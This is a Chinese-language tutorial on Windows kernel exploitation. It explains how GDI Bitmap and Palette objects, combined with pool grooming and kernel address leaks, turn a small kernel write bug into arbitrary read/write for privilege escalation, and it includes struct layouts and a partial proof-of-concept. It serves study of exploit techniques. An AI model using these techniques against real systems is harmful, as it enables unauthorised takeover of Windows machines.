# Write What Where

## BITMAP(位图) 简介

HBITMAP CreateBitmap(int nWidth,int nHeight,UINT nPlanes,UINT nBitCount,const VOID *lpBits);

(nBitCount是一个像素占用的位,如果nBitCount为32,则一个像素为4位 也就是乘4)

Windows7 (X64)
创建堆块大小 0x0240 + nWidth * nHeight * nBitCount 

(1503)
创建堆块大小 0x0260 + nWidth * nHeight * nBitCount 

(1703)
创建堆块大小 0x0270 + nWidth * nHeight * nBitCount 

SURFOBJ.cjBits = nWidth * nHeight * nBitCount

修改SURFOBJ.sizlBitmap结构中的cx和cy,都可以达到类似数组越界漏洞的效果,SURFOBJ.cjBits的大小为pixel data的大小,但如果修改了SURFOBJ.sizlBitmap结构,SURFOBJ.cjBits大小并不进行安全校验.

所以,内核中哪怕1字节的(任意地址修改任意值),(任意地址写固定值,随机值)只要写入的内容不是0,也可以利用该漏洞去修改下一个SURFACE结构的SURFOBJ中的PvScan0,来进行任意地址读写.

如果创建BitMap时 lpBits不指定 则会额外创建池块处理PvScan0 

SURFOBJ结构

```c

typedef struct _SURFOBJ { 
	DHSURF dhsurf; 
	HSURF  hsurf;
	DHPDEV dhpdev; 
	HDEV   hdev; 
	SIZEL  sizlBitmap; 
	ULONG  cjBits; 
	PVOID  pvBits; 
	PVOID  pvScan0; 
	LONG   lDelta; 
	ULONG  iUniq; 
	ULONG  iBitmapFormat; 
	USHORT iType; 
	USHORT fjBitmap; 
} SURFOBJ, *PSURFOBJ;

```


### 释放

BOOL DeleteObject(HGDIOBJ hObject);

该函数删除一个逻辑笔,画笔,字体,位图,区域或者调色板,释放所有与该对象有关的系统资源,在对象被删除之后,指定的句柄也就失效了

### 获取BitMap地址

#### Windows10 v1511


使用CreateBitmap创建一个位图,保存返回的句柄,bitmap句柄的最后两个字节是该结构在GdiSharedHandleTable数组中的索引(=>handle & 0xffff).

从PEB偏移0xf8(X64)处获取指向GdiSharedHandleTable的指针,该指针指向_GDI_CELL结构的数组

通过句柄的后16位来寻找索引的偏移,每个_GDI_CELL结构大小为0x18(X64),0x10(X86)
GdiSharedHandleTable + (BitMap_Handle & 0xFFFF)*0x18 可以获取SURFACE结构在内核内存中的位置.

通过计算偏移即可获取PvScan0所在的内存地址,配合其他漏洞获取 ARW Primitives


#### Windows10 v1607 Rs1


使用LocalAlloc分配一块内存,大小为 0x06 * 0x300

使用CreateAcceleratorTable 生成一个有0x300表项的加速器表,此时分配的是一个0x1200大小的内存池块,SessionPool.

User32!gSharedInfo 结构中的 aheList 结构中保存了一个pKernel指针,该指针指向这个句柄的内核地址.

aheList为指向PUSER_HANDLE_ENTRY结构数组的指针

通过加速器句柄(HACCEL)的低16位(PUSER_HANDLE_ENTRY结构数组偏移),可以获取到加速器内核地址.

由于加速器使用的也是SessionPool 所以释放该加速器后,重新申请同样大小的SessionPool则可以使用释放的内存

CreateBitmap(0x0FA0, 0x01, 0x01, 0x08, Data);

0x260 + 0xFA0 = 0x1200 占坑

即可获取SURFACE结构的地址


#### Windows10 v1703 Rs2


(BitMap的SurFace结构 在v1703上比v1503增大了10)
创建堆块大小 0x0270 + nWidth * nHeight * nBitCount 

首先创建一个窗口(RegisterClassW+CreateWindowExW)

memset(LpszMNames,'A', 0x1000-10);

创建出保存 lpszMenuName 的内核池为 0x1000 字节大小

因为保存0x10字节的Heap Header 所以说 Size - 0x10

//内存缩紧,提前占用空闲 0x1000 字节的Session Pool 这样就可以保证释放 lpszMenuName 后 创建的 BitMap 稳定复用 lpszMenuName 的内存地址了

while (I < 0x500){
	++I;
	CreateBitmap(0xD90, 0x01, 0x01, 0x08, Data);
}

如何获取lpszMenuName的内核地址呢

首先获取 UlClientDelta 这是用户桌面堆和内核桌面堆的一个偏移,使用内核桌面堆的地址 减去 UlClientDelta 就是用户桌面堆的地址了.

UlClientDelta = TagWnd.head.pSelf - TagWnd 即可得出用户态映射的桌面堆在内核中的偏移

TagCls = TagWND + 0xa8

Address(lpszMenuName) = *((TagCls + 0x90) - UlClientDelta)

为什么要减去 UlClientDelta 呢,因为内核地址我们没办法读取 只能通过用户模式的映射获取到lpszMenuName,也就是释放之后SurFace结构的地址

这时释放窗口

Session Pool中 空闲一个0x1000字节大小的内核池

CreateBitmap(0xD90, 0x01, 0x01, 0x08, Data);

这时我们就已经占坑了,可以在 Windbg 中看到我们的 SurFace 结构使用了 lpszMenuName 所占用的 SessionPool.



### 利用 BITMAP 进行任意地址写


创建两个(多个)Bitmap,获取到其中一个SURFACE结构的地址,通过偏移寻找到SURFOBJ结构中的PvScan0,将PvScan0的内容修改为另外一个Bitmap的PvScan0地址.

使用 SetBitmapBits(HBITS_B\[M_UAF_ID](PvScan0被修改成另外一个块的结构), 0x08, Where_TO_DO(想要读或写的内存地址的指针));

使用 GetBitmapBits(HBITS_B\[W_UAF_ID](另外一个块), 0x08, &EPROCESS);来读取8字节到EPROCESS指向的内存中

使用 SetBitmapBits(HBITS_B\[W_UAF_ID](另外一个块), 0x08, Where_TO_DO(想要写入内容的指针));来向设置的地址写入8字节



### 1字节任意地址读写 利用BitMap提权

实验环境:
  Windows7 X64专业版


首先分配0x500个0x1000字节的 Pool

这一步的目的是内存缩紧,缩紧到没有多余的0x1000字节大小的空闲内核池(其实可能还是有=_=,不过问题不大),来干扰Large Pool的分割

```c
for (i = 0; i < 0x500; ++i){
	CreateBitmap(0xDC0, 0x01, 0x01, 0x08, Data1);
}
```

然后分配0x2000字节大小的 Large Pool
Windows7 (X64) 创建池块大小 0x0240 + nWidth * nHeight * nBitCount,
所以 此处使用 BigPool = CreateBitmap(0x1DC0, 0x01, 0x01, 0x08, Data);

接着释放这个Pool 
DeleteObject(BigPool);

此时,占用了0x2000字节的大块是被释放的
立刻申请两个0x1000字节的块

F_Pool = CreateBitmap(0xDC0, 0x01, 0x01, 0x08, Data1);
S_Pool = CreateBitmap(0xDC0, 0x01, 0x01, 0x08, Data2);

通过泄露BitMap地址,可以发现我们已经占用了释放的Large Pool

SURFOBJ64 结构偏移0x20 处为 sizlBitMap 结构,该结构如下

```c
typedef strucy tagSIZE{
  LONG cx;
  LONG cy;
}SIZE,*PSIZE;
```

我们只需要覆盖其中一个结构 即可进行越界读写内存(OOB);

F_POOL->sizlBitMap = 00000001`00000dc0;

此处,我们通过WWW漏洞将 F_POOL->sizlBitMap.cy 修改成0x02

这样我们的读写范围就变成 0xdc0 * 2 = 0x1B80

即可通过 F_Pool 任意读写 S_POOL 的内容

接下来修改S_POOL的PvScan0指针,即可任意地址读写

-----

## Palette (调色板) 简介

HPALETTE CreatePalette(const LOGPALETTE *plpal);

创建调色板,只有一个参数为指向LOGPALETTE结构的指针

X86 下 size(PALETTE) 为 0x58 字节大小

X64 下 size(PALETTE) 为 0x98 字节大小

```c
typedef struct tagLOGPALETTE {
    WORD        palVersion;
    WORD        palNumEntries;
    _Field_size_opt_(palNumEntries) PALETTEENTRY        palPalEntry[1];
} LOGPALETTE, *PLOGPALETTE, NEAR *NPLOGPALETTE, FAR *LPLOGPALETTE;
```

palVersion 设置为 0x0300 即可

palNumEntries 为 palPalEntry 的个数,每个 PALETTEENTRY 结构为 0x04字节大小(包括X64)

CreatePalette(PPlette); 

函数会创建一个 (Sizeof(PALETTE) + palNumEntries * 4) 大小的 Kernel Pool 来保存PALETTE结构

PALETTE 结构 末尾的 apalColors 结构 为 PALETTEENTRY结构的数组 默认为 8 字节大小(默认项数为0x02),Kernel Pool 保存 PALETTE 结构时,会根据 palNumEntries 来设置 apalColors 数组的项数

PALETTE 结构中的变量 cEntries 为 LOGPALETTE 结构中的 palNumEntries,来代表当前 apalColors数组有多少项

修改 PALETTE.cEntries 则可以进行 越界读写(OOB)

PALETTE.pFirstColor 为指向 PALETTE.apalColors 地址的指针

修改 PALETTE.pFirstColor 则可以进行 任意地址读写(WWW)


PALETTE 结构

```c
typedef struct _PALETTE { 
	BASEOBJECT      BaseObject; 
	FLONG           flPal; 
	ULONG           cEntries; 
	ULONG           ulTime; 
	HDC             hdcHead; 
	ULONG        hSelected; 
	ULONG           cRefhpal; 
	ULONG          cRefRegular; 
	ULONG      ptransFore; 
	ULONG      ptransCurrent; 
	ULONG      ptransOld; 
	ULONG           unk_038; 
	ULONG64         pfnGetNearest;
	ULONG   pfnGetMatch; 
	ULONG           ulRGBTime; 
	ULONG       pRGBXlate; 
	PALETTEENTRY    *pFirstColor; 
	struct _PALETTE *ppalThis; 
	PALETTEENTRY    apalColors[1]; 
}PALETTE;

```

### Find Palette Pool

从Windbg中搜索创建的调色板 PALETTE结构
> !poolfind Gl?8 -session

### 释放 Palette

DeleteObject(HPalette);

### 获取 Palette 地址

创建窗口时通过设置窗口类菜单名称,可以分配任意大小的Kernel Session Pool,可以利用这一点来预测Palette结构的地址

wndclass.lpszMenuName = (LPCWSTR)LpszMNames;

(为了避免有相同大小的空闲 Session Pool,先申请 N个 同大小的Palette结构,来占用内存会提高成功几率)

首先算好Palette结构需要占坑的大小,接着创建窗口,使用 HMValidateHandle 函数(BITMAP一节中有介绍)获取tagCls.lpszMenuName 指向的地址,此处为占坑地址,释放窗口,释放窗口类,创建Palette结构即可

tagCls地址获取方法

TagWnd = HMValidateHandle(HWND,1);

返回值为 tagWnd桌面堆在用户态映射的地址

TagWnd.head.pSelf 为 pSelf ,是TagWnd结构在内核池中的地址

Kenrl_Pool_OffSet(DeskTop Heap) = TagWnd.head.pSelf - TagWnd 可以算出 用户态映射的桌面堆 和内核态桌面堆的偏移

TagWnd.pcls 为当前窗口类的地址,也就是tagCls结构的内核地址

TagWnd.pcls - Kenrl_Pool_OffSet(DeskTop Heap) = TagCls 即可获取到用户态映射下TagCls结构的地址

TagCls.lpszMenuName 为 分配的窗口菜单名称,分配在Session Pool里

获取到 TagCls.lpszMenuName 的地址后,释放窗口,以及窗口类,创建PALETTE即可复用

以下为Poc中部分代码

```c

  HINSTANCE hInstance;
	HWND hwnd, pwd;     
	WNDCLASS wndclass = { 0 }; 
	memset(LpszMNames, 'F', 0x1000-0x08);
	hInstance = GetModuleHandleA(0);
	wndclass.style = CS_HREDRAW | CS_VREDRAW;
	wndclass.lpfnWndProc = DefWindowProc;
	wndclass.hInstance = hInstance;
	wndclass.hIcon = LoadIcon(NULL, IDI_APPLICATION);
	wndclass.hCursor = LoadCursor(NULL, IDC_ARROW);
	wndclass.hbrBackground = (HBRUSH)GetStockObject(WHITE_BRUSH);
	wndclass.lpszMenuName = (LPCWSTR)LpszMNames;
	wndclass.lpszClassName = TEXT("case");

	if (!RegisterClass(&wndclass)){
		printf("Register Window Class Error!\n");
		return 1;
	}

  hwnd = CreateWindowEx(0, wndclass.lpszClassName, TEXT("WORDS"), 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);

	printf("hwnd:%p\n", hwnd);

	pwd = (HWND)HMValidateHandle(hwnd, 1);

	ULONG ulClientDelta = *(ULONG*)((ULONG)pwd + 0x10) - (ULONG)pwd;

	ULONG TagCls = *(ULONG*)((ULONG)pwd + 0x64) - ulClientDelta;

	PALETTE_Address = *(ULONG*)((ULONG)TagCls + 0x50);

	//__asm int 3

	printf("TagCls:0x%p\n", TagCls);

	printf("TagWnd:0x%p\n", pwd);

	printf("PALETTE_Address:0x%p\n", PALETTE_Address);

	DestroyWindow(hwnd);

  //内存缩紧
  while (I <= 0x500){
      CreatePalette(Palette);
	    ++I;
  }

  //释放窗口类
  UnregisterClass(TEXT("case"), GetModuleHandleA(0));

  //地址泄露!
  HPAL = CreatePalette(Palette);

```



### 利用 Palette 进行任意地址读写

通过修改 PALETTE.pFirstColor 的指针后,则可使用
 SetPaletteEntries(HPALETTE Hpal,UINT iStartIndex,UINT nEntries,LPPALETTEENTRY lppe); 
函数进行任意地址写


SetPaletteEntries(HPALETTE,0,0x05,Entries)

参数 1 Hpal 为 CreatePalette 函数返回的调色板句柄

参数 2 iStartIndex 为 从 apalColors 数组中第几项开始写

参数 3 nEntries 为 到 apalColors 数组中第几项结束

参数 4 lppe 为 PALETTEENTRY 结构数组的指针,每项4字节,通过设置此参数来写入任意值

创建两个 PALETTE 结构,覆写 PALETTE.pFirstColor 指针后,可参考BITMAP的利用方法 获取无限制的 ARW Primitiver


使用
 GetPaletteEntries(HPALETTE Hpal,UINT iStartIndex,UINT nEntries,LPPALETTEENTRY lppe); 
函数进行任意地址读

GetPaletteEntries(HPALETTE,0,0x05,Entries)

参数 1 Hpal 为 CreatePalette 函数返回的调色板句柄

参数 2 iStartIndex 为 从 apalColors 数组中第几项开始读

参数 3 nEntries 为 到 apalColors 数组中第几项结束

参数 4 lppe 为 PALETTEENTRY 结构数组的指针,每项4字节,通过设置此参数来读取任意值

